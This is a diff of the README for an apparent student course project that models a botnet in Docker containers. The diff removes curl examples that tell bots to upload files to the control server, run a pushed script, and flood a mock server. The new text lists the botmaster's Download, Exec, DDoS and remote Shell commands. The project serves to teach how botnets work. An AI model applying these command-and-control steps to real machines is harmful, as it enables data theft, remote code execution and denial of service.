@@ -1,23 +1,30 @@
-## Run
-1) make build-all
-2) python3 compose-maker.py         //se puede configurar la cantidad de bots
-3) make start-all
+# Trabajo Final 66.69 - BotNet - Grupo 10
 
-## Posibles instrucciones del botmaster
-- Instruir a los bots a que manden un archivo suyo al server.
-```bash
-curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "Download", "name": "test1.txt", "filepath": "test_files/test1.txt", "objective": "All"}'
-```
+Sistema educativo que modela una botnet y como un botmaster controla y comanda a computadoras infectadas para distintos fines.
 
-- Enviar un ejecutable a los bots y hacer que lo ejecuten.
-```bash
-curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "Exec", "name": "test1.js", "data": "#!/usr/bin/env node
-console.log('Hello world picadita.md'), "objective": "All"}'
-```
-- Indicarle a todos los bots a hacer DDoS por 2 segundos al mocksv. Para ver el delay que genera en el servidor se puede dejar corriendo el mock-client.py que va logeando el tiempo de respuesta del mock-server.
+## Instrucciones de Uso
 
-```bash
-curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "DDoS", "ip": "mock-server", "port": 7000, "time": 2, "objective": "All"}'
-```
+### Levantar Servidores y clientes
+1) Buildear las imágenes de docker
+> $ make build-all  
 
-Nota: Los mensajes se pueden dirigir a un subset de los bots en vez de a "All", funcionalidad a mejorar. Por ahora el formato es objective="::ffff:172.28.0.4" con 172.28.0.4 la ip del container.
+2) OPCIONAL: crear una arquitectura con una cantidad distinta de clientes que la por defecto    
+- Editar el archivo compose-maker.py modificando la variable num_clients
+> $ python compose-maker.py
+
+3) Correr los contenedores
+> $ make start-all
+
+Recomendamos Docker Desktop para ver los logs, pero como alternativa se puede usar docker logs.
+
+### Correr el Botmaster
+> $ python cli-botmaster.py
+
+Abre una CLI para interactuar con los bots a través del server.
+Algunos de los comandos soportados son:
+- Download: Descarga un archivo de la computadora infectada elegida al server.
+- Exec: Ejecutar un archivo que envía el botmaster en el bot elegido.
+- DDoS: Ordena al bot a enviar HTTP GET a una IP:PUERTO.
+- Shell: Abre una shell remota con la maquina objetivo.
+
+Los argumentos esperados de cada comando se pueden ver si en la CLI se llama al comando sin argumentos.
